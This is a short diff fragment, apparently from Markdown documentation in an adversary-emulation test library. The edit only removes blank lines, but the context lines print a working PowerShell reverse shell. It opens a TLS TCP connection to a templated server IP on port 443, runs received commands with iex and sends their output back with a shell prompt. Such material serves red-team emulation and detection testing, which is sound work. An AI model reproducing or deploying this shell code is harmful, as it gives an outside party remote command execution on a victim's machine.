@@ -43,7 +43,6 @@ $sendback = (iex $data | Out-String ) 2>&1;
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
-
 $server_ip = #{server_ip}
 $server_port = 443
 $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '443')
@@ -60,7 +59,6 @@ $sendback = (iex $data | Out-String ) 2>&1;
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
-
 ```
 
 ## Commands Dataset
